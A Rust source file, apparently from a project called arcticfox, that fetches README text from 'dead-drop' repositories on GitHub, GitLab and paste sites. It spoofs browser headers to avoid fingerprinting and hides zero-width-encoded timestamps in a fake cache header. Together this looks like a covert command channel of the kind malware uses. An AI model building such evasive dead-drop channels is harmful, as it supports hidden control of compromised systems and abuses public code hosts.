//! Fetcher: async HTTP client for reading README content from dead-drop repos.
//!
//! Handles fetching from GitHub, GitLab, and Debian paste sources.
//! Supports both raw URL fetching and authenticated API access.
//! Headers are randomized per-request to avoid fingerprinting.
//! ZW-encoded data is embedded in headers for invisible data channels.

use rand::Rng;
use reqwest::Client;
use std::time::Duration;
use tracing::debug;

use arcticfox_core::config::RepoSource;
use arcticfox_core::error::{ArcticFoxError, Result};
use arcticfox_core::zwcodec;

// Re-export from core for convenience — single source of truth for UA pool
pub use arcticfox_core::repo::random_user_agent;

const FETCH_TIMEOUT: Duration = Duration::from_secs(15);
const MAX_FETCH_SIZE: usize = 2 * 1024 * 1024; // 2 MB

/// Get a set of HTTP headers that mimic real browser requests.
/// The X-Cache-Breaker header carries ZW-encoded timing data invisibly.
fn mimicked_headers() -> Vec<(&'static str, String)> {
    let mut rng = rand::thread_rng();

    let accept_headers = [
        "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "text/html,application/xhtml+xml;q=0.9,image/webp,*/*;q=0.8",
        "application/json,text/html;q=0.9,text/plain;q=0.8,*/*;q=0.5",
        "text/html,application/xhtml+xml,image/webp;q=0.9",
    ];

    let accept_lang = [
        "en-US,en;q=0.9",
        "en-GB,en;q=0.8,en-US;q=0.6",
        "en;q=0.9,fr;q=0.5",
        "en-CA,en;q=0.8,fr-CA;q=0.4",
    ];

    let cache_ctrl = [
        "no-cache",
        "max-age=0",
        "no-cache, no-store, must-revalidate",
    ];

    // ZW-encode current timestamp in cache-breaker header — looks like a number, carries hidden epoch
    let ts_bytes = chrono::Utc::now().timestamp().to_le_bytes().to_vec();
    let cache_param = format!("{}{}", rng.gen_range(100000..999999u32), zwcodec::encode(&ts_bytes));

    vec![
        ("Accept", accept_headers[rng.gen_range(0..accept_headers.len())].to_string()),
        ("Accept-Language", accept_lang[rng.gen_range(0..accept_lang.len())].to_string()),
        ("Cache-Control", cache_ctrl[rng.gen_range(0..cache_ctrl.len())].to_string()),
        ("DNT", "1".to_string()),
        ("Upgrade-Insecure-Requests", "1".to_string()),
        ("X-Cache-Breaker", cache_param),
    ]
}

pub struct Fetcher {
    client: Client,
}

impl Fetcher {
    pub fn new() -> Result<Self> {
        let client = Client::builder()
            .user_agent(random_user_agent())
            .timeout(FETCH_TIMEOUT)
            .tcp_nodelay(true)
            .pool_idle_timeout(Duration::from_secs(90))
            .pool_max_idle_per_host(5)
            .build()
            .map_err(|e| ArcticFoxError::Internal {
                message: format!("Failed to build HTTP client: {e}"),
            })?;

        Ok(Fetcher { client })
    }

    pub fn client(&self) -> Client {
        self.client.clone()
    }

    pub async fn fetch_readme(&self, repo: &RepoSource) -> Result<String> {
        let url = repo.raw_url();

        let cache_param = match rand::thread_rng().gen_range(0..3) {
            0 => format!("nocache={}", rand::random::<u32>()),
            1 => format!("_={}", chrono::Utc::now().timestamp()),
            _ => format!("t={}", rand::random::<u64>()),
        };
        let separator = if url.contains('?') { "&" } else { "?" };
        let full_url = format!("{}{}{}", url, separator, cache_param);

        debug!("Fetching {}", repo.label());

        let mut req = self
            .client
            .get(&full_url)
            .header("Accept", "text/plain, application/vnd.github.v3.raw")
            .header("Pragma", "no-cache");

        for (key, val) in mimicked_headers() {
            if key == "Accept" { continue; }
            req = req.header(key, val);
        }

        let resp = req
            .send()
            .await
            .map_err(|e| ArcticFoxError::Http {
                url: full_url.clone(),
                source: e,
            })?;

        let status = resp.status();
        if !status.is_success() {
            let body = resp.text().await.unwrap_or_default();
            return Err(ArcticFoxError::http_status(
                full_url,
                status.as_u16(),
                body,
            ));
        }

        let bytes = resp
            .bytes()
            .await
            .map_err(|e| ArcticFoxError::Http {
                url: full_url,
                source: e,
            })?;

        let limited = if bytes.len() > MAX_FETCH_SIZE {
            &bytes[..MAX_FETCH_SIZE]
        } else {
            &bytes
        };

        String::from_utf8(limited.to_vec()).map_err(|e| ArcticFoxError::Internal {
            message: format!("Invalid UTF-8 in fetched content: {e}"),
        })
    }
}
